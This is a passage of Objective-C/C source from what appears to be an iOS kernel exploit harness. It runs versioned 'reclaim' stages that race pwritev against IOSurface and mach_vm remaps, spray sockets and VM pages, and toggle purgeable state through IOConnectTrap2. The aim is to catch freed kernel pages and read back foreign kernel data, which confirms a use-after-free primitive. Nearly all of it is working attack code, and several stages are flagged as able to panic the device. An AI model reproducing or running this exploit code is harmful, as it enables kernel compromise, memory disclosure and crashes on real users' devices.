                   the dead backing — the kernel copy engine blocks instead
                   of faulting): tear the alias AND the entry down BEFORE
                   the release, not after the re-race. */
                (void)mach_vm_deallocate(mach_task_self(), reMap, 0x8000);
                (void)mach_port_deallocate(mach_task_self(), reObj);
                CFRelease(reSurf);
                (void)rfillArr;
                rc_log("[v12] surface released + alias torn down; spray pressure still on (sockets so far: %llu)",
                       rc_sprayAllocs);
                /* re-race the union of this boot's hot offsets via the
                   replay iter choreography — content that is neither our
                   tags nor rfill = foreign kernel reuse in the window */
                uint64_t hw2 = 0, hf2 = 0, hp2 = 0, hown2 = 0, hit2 = 0;
                int aimDumped = 0;
                /* v12.3 stall pinpoint: the first two iterations log each
                   syscall stage; a hang names its call on the receipt */
                for (int it2p = 0; it2p < 2; it2p++)
                    rc_log("[v12 stall-probe %d] ready", it2p);
                for (uint32_t ho = 0; ho < rc_hotN + 1 && ho < 24; ho++) {
                    if (rc_swap_dead) break;
                    if (rc_hotN == 0 && warmN == 0) break;
                    uint64_t off = (ho < rc_hotN)
                        ? rc_hotOffs[ho] : rc_warm[warmN - 1];
                    rc_log("[v12] window %u off=0x%llx start", ho,
                           (unsigned long long)off);
                    uint32_t pg = (uint32_t)(off / vm_page_size);
                    for (int it2 = 0; it2 < 30; it2++) {
                        if (ho == 0 && it2 < 2)
                            rc_log("[v12 stall-probe %d] pre-map", it2);
                        mach_vm_address_t a = pcBig;
                        mach_vm_map(mach_task_self(), &a, 0x8000, 0,
                            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0,
                            false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                        memset_pattern8((void *)pcBig, &m0, 0x8000);
                        (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                        struct iovec iov12 = { (void *)(pcBig + 0x3f00), 0x4000 };
                        if (ho == 0 && it2 < 2)
                            rc_log("[v12 stall-probe %d] pre-write", it2);
                        rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                        rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                        rc_raceOn = 1;
                        { int w12 = rc_pwritev_bounded14(fdMark, iov12.iov_base, iov12.iov_len, 0x3f00, 5000); (void)w12; }
                        if (rc_raceOn_wait(5000) < 0) { rc_log("[v12 STALL] swap wedged >5 s at off=0x%llx (kernel) — window aborted", (unsigned long long)off); break; }
                        if (ho == 0 && it2 < 2)
                            rc_log("[v12 stall-probe %d] post-write", it2);
                        (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                        uint64_t got2 = 0; int32_t delta2 = 0;
                        rc_cls_t c12 = rc_cls(rbBuf, pg + 1, npages, &got2, &delta2);
                        if (c12 == C_WRONG) hw2++;
                        else if (c12 == C_FOREIGN) {
                            hf2++;
                            if (hit2 < 4) {
                                /* fingerprint check FIRST: rfill still ours */
                                BOOL ourFp = NO;
                                for (int qi = 0; qi < RC_NQ; qi++)
                                    if (rbBuf[qi] == rfill || rbBuf[qi] == rfill2)
                                        { ourFp = YES; break; }
                                if (ourFp) hown2++;
                                else {
                                    hit2++;
                                    rc_log("  v12 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
                                           "(kernel reuse candidate)",
                                           (unsigned long long)off, rbBuf[0], rbBuf[1]);
                                    if (aimDumped < 2) {
                                        rc_aim(rbBuf, c12, fdMark, off,
                                               vm_page_size, hmarker);
                                        aimDumped++;
                                    }
                                }
                            }
                        }
                        else if (c12 == C_PARTIAL) {
                            hp2++;
                            if (aimDumped < 2) {
                                rc_aim(rbBuf, c12, fdMark, off,
                                       vm_page_size, hmarker);
                                aimDumped++;
                            }
                        }
                    }
                }
                rc_log("v12 reclaim: WRONG=%llu FOREIGN=%llu (reuse-hits=%llu "
                       "fp-still-ours=%llu) PARTIAL=%llu",
                       hw2, hf2, hit2, hown2, hp2);
                if (hit2 > 0) {
                    /* the bandit scores the foreign read immediately */
                    char fh12[24];
                    snprintf(fh12, sizeof fh12, "%llu", (unsigned long long)hit2);
                    LabBanditFeat fe12[2] = { { "stage", "v12-reclaim" },
                                              { "foreign", fh12 } };
                    LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                        LABB_SIG_FOREIGN, LABB_E_DEVICE, fe12, 2);
                } else {
                    LabBanditNote("cscali", "v12 reclaim: no foreign reuse captured");
                }
            }
        }
    }

    /* ---- v12.2 RECLAIM (cs2 mlock-munlock choreography): bind ONE
       fingerprint surface at ONE hot window's own address (IOSurfaceAddress
       = searchMap + off — the same binding the in-app searchMap wrap uses),
       mlock it, then release it — exactly that page goes back to the pool —
       and re-race the single stale index. Non-own content = kernel reuse in
       a page we SPECIFICALLY freed. Uses only our own addresses; if the
       kernel refuses client-supplied IOSurfaceAddress on this device, the
       stage logs that honestly and continues (v12's whole-surface path
       already ran above). PANIC-POSSIBLE; solo; one per force-quit. */
    if (g_runMlock) {
        rc_log("--- v12.2 RECLAIM: bind->mlock->munlock(one window)->re-race (PANIC-POSSIBLE) ---");
        uint64_t cand22[8]; uint32_t candN = 0;
        for (uint32_t i = 0; i < rc_hotN && candN < 4; i++) cand22[candN++] = rc_hotOffs[i];
        if (warmN && candN < 8) cand22[candN++] = rc_warm[warmN - 1];
        static uint64_t rfillA = 0, rfillB2 = 0;
        rfillA  = ((uint64_t)arc4random() << 32) | arc4random();
        rfillB2 = ~rfillA;
        uint32_t bound22 = 0, refused22 = 0, hits22 = 0, ours22 = 0;
        for (uint32_t ci = 0; ci < candN; ci++) {
            if (rc_swap_dead) break;
            uint64_t off = cand22[ci];
            IOSurfaceRef s22 = NULL;
            {
                CFMutableDictionaryRef d22 = CFDictionaryCreateMutable(
                    kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
                    &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(d22, CFSTR("IOSurfaceAddress"),
                                     RCNUM((int64_t)(searchMap + off)));
                CFDictionarySetValue(d22, CFSTR("IOSurfaceAllocSize"),
                                     RCNUM((int64_t)vm_page_size));
                s22 = pCreate((__bridge CFDictionaryRef)(__bridge NSDictionary *)d22);
                CFRelease(d22);
            }
            if (!s22) {
                refused22++;
                if (ci == 0) rc_log("[v12.2] bind not honored (IOSurfaceAddress refused) — stage2 skipped");
                continue;
            }
            bound22++;
            if (pPrefetch) pPrefetch(s22);   /* mlock the single window */
            /* fingerprint the bound range through our task mapping */
            for (uint32_t q = 0; q < (uint32_t)(vm_page_size / 16); q++) {
                uint64_t *w = (uint64_t *)(searchMap + off) + 2 * q;
                w[0] = rfillA; w[1] = rfillB2;
            }
            /* munlock = release: exactly this window returns to the pool */
            CFRelease(s22);
            /* re-race ONLY this stale index, 25 iters */
            uint32_t pg22 = (uint32_t)(off / vm_page_size);
            for (int it22 = 0; it22 < 25; it22++) {
                mach_vm_address_t a22 = pcBig;
                mach_vm_map(mach_task_self(), &a22, 0x8000, 0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                memset_pattern8((void *)pcBig, &m0, 0x8000);
                (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                struct iovec iov22 = { (void *)(pcBig + 0x3f00), 0x4000 };
                rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                rc_raceOn = 1;
                { int w22 = rc_pwritev_bounded14(fdMark, iov22.iov_base, iov22.iov_len, 0x3f00, 5000); (void)w22; }   /* was a DIRECT unbounded pwritev */
                if (rc_raceOn_wait(5000) < 0) { rc_log("[v12.2 STALL] swap wedged >5 s at off=0x%llx (kernel) — stage aborted", (unsigned long long)off); break; }
                (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                uint64_t got22 = 0; int32_t dlt22 = 0;
                rc_cls_t c22 = rc_cls(rbBuf, pg22 + 1, npages, &got22, &dlt22);
                if (c22 == C_FOREIGN) {
                    BOOL fp22 = NO;
                    for (int qi = 0; qi < RC_NQ; qi++)
                        if (rbBuf[qi] == rfillA || rbBuf[qi] == rfillB2)
                            { fp22 = YES; break; }
                    if (fp22) ours22++;          /* page came back to US, not the kernel */
                    else if (hits22 < 3) {
                        hits22++;
                        rc_log("  v12.2 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
                               "(single-window reuse candidate)",
                               (unsigned long long)off, rbBuf[0], rbBuf[1]);
                        rc_aim(rbBuf, c22, fdMark, off, vm_page_size, hmarker);
                    }
                }
            }
        }
        rc_log("v12.2: bound=%u refused=%u hits=%u fp-still-ours=%u",
               bound22, refused22, hits22, ours22);
        rc_plan_note("v12.2", hits22);
        if (hits22 > 0) {
            char fh22[24];
            snprintf(fh22, sizeof fh22, "%u", hits22);
            LabBanditFeat fe22[2] = { { "stage", "v12.2-mlock" },
                                      { "foreign", fh22 } };
            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                LABB_SIG_FOREIGN, LABB_E_DEVICE, fe22, 2);
        }
    }

    /* ---- v13 RECLAIM (purgeable state-1 feed): Metal texture plant on the
       lock window's own bound surface registers the IOSurface as a live
       IOGPU resource of THIS client's conn (staleentry census pattern);
       then make it volatile (Trap2 conn,3,rid,1), re-race the stale indexes
       while the backing sits in the volatile pool, and RESTORE (state=0).
       No teardown, no munlock of live windows — the v12 stall class never
       fires here by construction. PANIC-POSSIBLE (granular feed only;
       state=6 bulk sweep is banned above). Solo; one per force-quit. */
    if (g_runV13) {
        rc_log("--- v13 RECLAIM: purgeable state-1 feed on the lock window (PANIC-POSSIBLE) ---");
        v13_loadTrap();
        uint32_t vol13 = 0, hits13 = 0, fpOurs13 = 0, restored13 = 0;
        io_connect_t owner13 = 0;
        id<MTLDevice> dev13 = nil;
        id<MTLTexture> tex13 = nil;
        uint32_t v13Rid = (lockSurf && v13_getID) ? v13_getID(lockSurf) : 0;

        if (!lockSurf || !v13_sTrap2 || !v13_getID) {
            rc_log("[v13] lock surface=%s IOConnectTrap2=%s IOSurfaceGetID=%s — stage skipped",
                   lockSurf ? "ok" : "NULL", v13_sTrap2 ? "ok" : "NULL",
                   v13_getID ? "ok" : "NULL");
        } else {
            /* the Metal plant: only this step puts OUR rid into an IOGPU
               owner table we can census (raw IOSurfaceCreate conns don't
               own resources — v12 receipts) */
            dev13 = MTLCreateSystemDefaultDevice();
            if (dev13) {
                MTLTextureDescriptor *d13 = [MTLTextureDescriptor
                    texture2DDescriptorWithPixelFormat:MTLPixelFormatBGRA8Unorm
                                                 width:64 height:64 mipmapped:NO];
                d13.usage = MTLTextureUsageShaderRead;
                tex13 = [dev13 newTextureWithDescriptor:d13 iosurface:lockSurf plane:0];
            }
            rc_log("[v13] Metal plant %@ on lockSurf rid=%u (sid)",
                   tex13 ? @"OK" : @"REFUSED", v13Rid);

            if (!tex13 || !v13Rid) {
                rc_log("[v13] census impossible without the plant — stage skipped honestly");
            } else {
                NSArray<NSNumber *> *cands13 = v13_portScan();
                rc_log("[v13] scan: %u conn candidates (sel=3 probe on each)",
                       (unsigned)cands13.count);
                for (NSNumber *pc13 in cands13) {
                    if (rc_swap_dead) break;
                    io_connect_t c13 = (io_connect_t)pc13.unsignedIntValue;
                    kern_return_t k1 = v13_sTrap2(c13, 3, v13Rid, 1);
                    if (k1 == KERN_SUCCESS) { owner13 = c13; vol13 = 1; break; }
                }
                if (!owner13) {
                    rc_log("[v13] NO conn hosts rid=%u (0xe00002c2 = not-found) — feed dead", v13Rid);
                } else {
                    rc_log("[v13] volatile ARMED conn=0x%x rid=%u (whole lock window %llu bytes)",
                           (unsigned)owner13, v13Rid, (unsigned long long)searchSize);
                    uint64_t cand13[8]; uint32_t cand13N = 0;
                    for (uint32_t i = 0; i < rc_hotN && cand13N < 4; i++)
                        cand13[cand13N++] = rc_hotOffs[i];
                    if (warmN && cand13N < 8) cand13[cand13N++] = rc_warm[warmN - 1];

                    for (uint32_t w13 = 0; w13 < cand13N; w13++) {
                        if (rc_swap_dead) break;
                        uint64_t off13 = cand13[w13];
                        uint32_t pg13 = (uint32_t)(off13 / vm_page_size);
                        for (int it13 = 0; it13 < 25; it13++) {
                            /* identical choreography to the v12.2 re-race loop */
                            mach_vm_address_t a13 = pcBig;
                            mach_vm_map(mach_task_self(), &a13, 0x8000, 0,
                                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
                                VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                            memset_pattern8((void *)pcBig, &m0, 0x8000);
                            (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                            struct iovec iov13 = { (void *)(pcBig + 0x3f00), 0x4000 };
                            rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                            rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off13;
                            rc_raceOn = 1;
                            { int w13b = rc_pwritev_bounded14(fdMark, iov13.iov_base, iov13.iov_len, 0x3f00, 5000); (void)w13b; }   /* was a DIRECT unbounded pwritev */
                            if (rc_raceOn_wait(5000) < 0) { rc_log("[v13 STALL] swap wedged >5 s at off=0x%llx (kernel) — stage aborted", (unsigned long long)off13); break; }
                            (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                            uint64_t got13 = 0; int32_t dlt13 = 0;
                            rc_cls_t c13c = rc_cls(rbBuf, pg13 + 1, npages, &got13, &dlt13);
                            if (c13c == C_FOREIGN) {
                                BOOL fp13 = NO;
                                for (int q13 = 0; q13 < RC_NQ; q13++)
                                    if (rbBuf[q13] == m0 || rbBuf[q13] == M0_TAG)
                                        { fp13 = YES; break; }
                                if (fp13) fpOurs13++;
                                else if (hits13 < 3) {
                                    hits13++;
                                    rc_log("  v13 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
                                           "(volatile-pool reuse candidate)",
                                           (unsigned long long)off13, rbBuf[0], rbBuf[1]);
                                    rc_aim(rbBuf, c13c, fdMark, off13, vm_page_size, hmarker);
                                }
                            }
                        }
                    }
                    kern_return_t k0 = v13_sTrap2(owner13, 3, v13Rid, 0);
                    restored13 = (k0 == KERN_SUCCESS) ? 1 : 0;
                    rc_log("[v13] restore state=0 kr=0x%x", k0);
                }
            }
            tex13 = nil;   /* plant released AFTER the restore */
            rc_log("v13: volatile=%u hits=%u fp-ours=%u restored=%u",
                   vol13, hits13, fpOurs13, restored13);
            rc_plan_note("v13", hits13);
            if (hits13 > 0) {
                char fh13[24];
                snprintf(fh13, sizeof fh13, "%u", hits13);
                LabBanditFeat fe13[2] = { { "stage", "v13-purgeable" },
                                          { "foreign", fh13 } };
                LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                    LABB_SIG_FOREIGN, LABB_E_DEVICE, fe13, 2);
            } else if (vol13 && !restored13) {
                LabBanditNote("cscali", "v13: volatile armed, restore kr!=0 — check before next tap");
            }
        }
    }

    /* ---- v14 RECLAIM (cs2-order): the proven ClearSword pass shape,
       adapted — bind->munlock->RECLAIM-SPRAY->re-race. Receipts law
       (2026-11-15): the pre-write pwritev wedge fires when the race runs
       against a window whose backing is freshly released (v12) or
       freshly volatile (v13) — the copy path blocks on a page sitting on
       a freelist/purge queue with a pending pager ref. cs2/poc.c never
       races a page in that state: its munlock runs at pass END (memory
       object already gone, nothing in flight) and no pass re-races the
       freed page. So v14 never lets the page linger:
         1. bind + prefetch + CFRelease ONE window (v12.2 move, exact)
         2. IMMEDIATE VM reclaim-spray (mach_vm_allocate + vpat fill) so
            the freed page lands in a LIVE mapping before anything
            touches it
         3. re-race ONLY that index through the unmodified choreography
         4. cs2 pass-end order — free the spray holders first
       No purgeable trap calls at all in this stage. PANIC-POSSIBLE;
       solo tap; knob "v14". */
    if (g_runV14) {
        rc_log("--- v14 RECLAIM: bind->munlock->reclaim-spray->re-race (PANIC-POSSIBLE) ---");
        uint64_t cand14[8]; uint32_t cand14N = 0;
        /* 2026-11-19: widen the freed-window lottery — the 21:28 receipt had
           bound=2 (1 boot-hot + 1 warm) with the churn kicker live; more
           windows = more chances the kernel zone takes a freed page. */
        for (uint32_t i = 0; i < rc_hotN && cand14N < 4; i++) cand14[cand14N++] = rc_hotOffs[i];
        for (uint32_t i = 0; warmN && i < warmN && i < 4 && cand14N < 8; i++)
            cand14[cand14N++] = rc_warm[warmN - 1 - i];   /* freshest warm first */
        /* multi-anchor: the reclaim spray carries the SECOND same-boot anchor
           (or the legacy constant when only one exists) — a reread window
           carrying vpat names the reclaim spray as the taker. */
        uint64_t vpat = (g_rcAnchorN > 1) ? g_rcAnchors[1] : 0x1337C0DE12345678ULL;
        uint64_t vpat2 = ~vpat;
        uint32_t bound14 = 0, refused14 = 0, spray14 = 0, sprayOwn14 = 0, hits14 = 0, fpOurs14 = 0;
        /* 2026-11-19 kernel-side reuse kicker (main-app receipt: v14 FOREIGN
           windows all userspace-shaped, zero kptr-band). The main socket
           spray was joined at the v9 boundary, so at re-race time NOTHING
           kernel-side competed for the freed page — it was recycled by
           page-cache/userspace allocations. One live inpcb/sbuff churner
           for the v14 windows makes KERNEL zone memory take the freed
           page instead. */
        pthread_t thSpray2 = 0;
        rc_sprayGo = 1;
        if (pthread_create(&thSpray2, NULL, rc_socket_spray_thread, NULL) == 0)
            rc_log("[v14] kernel-side socket churn live for the reclaim windows");
        else { rc_sprayGo = 0; rc_log("[v14] spray re-arm failed — reclaim runs without kernel churn (honest)"); }
        for (uint32_t ci = 0; ci < cand14N; ci++) {
            if (rc_swap_dead) break;
            uint64_t off = cand14[ci];
            IOSurfaceRef s14 = NULL;
            {
                CFMutableDictionaryRef d14 = CFDictionaryCreateMutable(
                    kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
                    &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(d14, CFSTR("IOSurfaceAddress"),
                                     RCNUM((int64_t)(searchMap + off)));
                CFDictionarySetValue(d14, CFSTR("IOSurfaceAllocSize"),
                                     RCNUM((int64_t)vm_page_size));
                s14 = pCreate((__bridge CFDictionaryRef)(__bridge NSDictionary *)d14);
                CFRelease(d14);
            }
            if (!s14) {
                refused14++;
                if (ci == 0) rc_log("[v14] bind not honored (IOSurfaceAddress refused) — stage skipped");
                continue;
            }
            bound14++;
            if (pPrefetch) pPrefetch(s14);   /* v12.2 move: pin the window */
            /* free exactly this window — nothing of ours is in flight */
            CFRelease(s14);
            /* step 2: the freed page goes to the NEXT allocator, not to a
               purge-queue wedge */
            uint32_t sprayGot = 0;
            mach_vm_address_t spr14[64];
            for (uint32_t k = 0; k < 64; k++) {
                mach_vm_address_t am = 0;
                kern_return_t krS = mach_vm_allocate(mach_task_self(), &am, 0x8000,
                                                     VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
                if (krS == KERN_SUCCESS) {
                    uint64_t *w = (uint64_t *)am;
                    for (uint32_t q = 0; q < (uint32_t)(0x8000 / 16); q++)
                        { w[2 * q] = vpat; w[2 * q + 1] = vpat2; }
                    spr14[sprayGot++] = am;
                }
            }
            /* step 3: re-race ONLY this stale index, 25 iters */
            uint32_t pg14 = (uint32_t)(off / vm_page_size);
            for (int it14 = 0; it14 < 25; it14++) {
                mach_vm_address_t a14 = pcBig;
                mach_vm_map(mach_task_self(), &a14, 0x8000, 0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                memset_pattern8((void *)pcBig, &m0, 0x8000);
                (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                struct iovec iov14 = { (void *)(pcBig + 0x3f00), 0x4000 };
                rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                if (it14 == 0) rc_log("[v14] window %u off=0x%llx pre-write",
                                      ci, (unsigned long long)off);
                rc_raceOn = 1;
                { int w14 = rc_pwritev_bounded14(fdMark, iov14.iov_base, iov14.iov_len, 0x3f00, 5000);
                  if (w14 == -2) rc_log("[v14 STALL] pre-write pwritev blocked >5 s — bounded stop; next window");
                }
                if (rc_raceOn_wait(5000) < 0) { rc_log("[v14 STALL] swap wedged >5 s at off=0x%llx (kernel) — window aborted", (unsigned long long)off); break; }
                if (it14 == 0) rc_log("[v14] window %u post-write", ci);
                (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                uint64_t got14 = 0; int32_t dlt14 = 0;
                rc_cls_t c14 = rc_cls(rbBuf, pg14 + 1, npages, &got14, &dlt14);
                if (c14 == C_FOREIGN) {
                    BOOL vp = NO, fp14 = NO;
                    for (int q14 = 0; q14 < RC_NQ; q14++) {
                        if (rbBuf[q14] == vpat || rbBuf[q14] == vpat2) { vp = YES; break; }
                        if (rbBuf[q14] == m0 || rbBuf[q14] == M0_TAG) { fp14 = YES; break; }
                    }
                    if (vp) { sprayOwn14++; continue; }   /* the spray took our page back */
                    if (fp14) { fpOurs14++; continue; }   /* still ours by tag */
                    if (hits14 < 3) {
                        hits14++;
                        rc_log("  v14 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
                               "(sprayed-then-reread — kernel reuse candidate)",
                               (unsigned long long)off, rbBuf[0], rbBuf[1]);
                        rc_aim(rbBuf, c14, fdMark, off, vm_page_size, hmarker);
                    }
                }
            }
            /* step 4: cs2 pass-end order — spray holders die first */
            for (uint32_t k = 0; k < sprayGot; k++)
                mach_vm_deallocate(mach_task_self(), spr14[k], 0x8000);
            spray14 += sprayGot;
        }
        rc_log("v14: bound=%u refused=%u sprayed=%u spray-own=%u fp-still-ours=%u hits=%u",
               bound14, refused14, spray14, sprayOwn14, fpOurs14, hits14);
        rc_plan_note("v14", hits14);
        if (hits14 > 0) {
            char fh14[24];
            snprintf(fh14, sizeof fh14, "%u", hits14);
            LabBanditFeat fe14[2] = { { "stage", "v14-cs2order" },
                                      { "foreign", fh14 } };
            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                LABB_SIG_FOREIGN, LABB_E_DEVICE, fe14, 2);
        }
        /* stop the kernel-side churner before teardown */
        rc_sprayGo = 0;
        if (thSpray2) pthread_join(thSpray2, NULL);
    }

    rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
    rc_log("OK=M0 + FAIL=ZERO = swap either loses (copy M0) or wins too early (EFAULT, no copy).");
    rc_log("OK=CORRECT = swap won and pwritev copied M1 correctly (no confusion).");
    rc_log("DONE — paste this text back");

    /* 2026-11-19: stop the re-armed swap thread BEFORE unmapping its
       objects (the 994-boundary join pattern + sticky-flag clear). */
    if (g_rcSwapRearmed) {
        rc_go = 0; rc_raceOn = 1;
        pthread_join(th, NULL);
        rc_raceOn = 0;
        g_rcSwapRearmed = 0;
    }

    close(fdZero); close(fdMark);
    if (lockSurf) CFRelease(lockSurf);
    mach_vm_deallocate(mach_task_self(), pcBig, 0x8000);
    mach_vm_deallocate(mach_task_self(), pcSmall, 0x2000);
    mach_vm_deallocate(mach_task_self(), searchMap, searchSize);
    mach_vm_deallocate(mach_task_self(), anonMap, 0x2000);
    mach_port_deallocate(mach_task_self(), pcObjBig);
    mach_port_deallocate(mach_task_self(), pcObjSmall);
    mach_port_deallocate(mach_task_self(), searchObj);
    mach_port_deallocate(mach_task_self(), anonObj);
    CFRelease(surfBig); CFRelease(surfSmall);
    free(zbuf);

done:;
    if (g_rc_log_fd >= 0) { close(g_rc_log_fd); g_rc_log_fd = -1; }
    NSString *result = [g_rc_log_str copy];
    g_rc_log_str = nil;
    return result;
}

@end
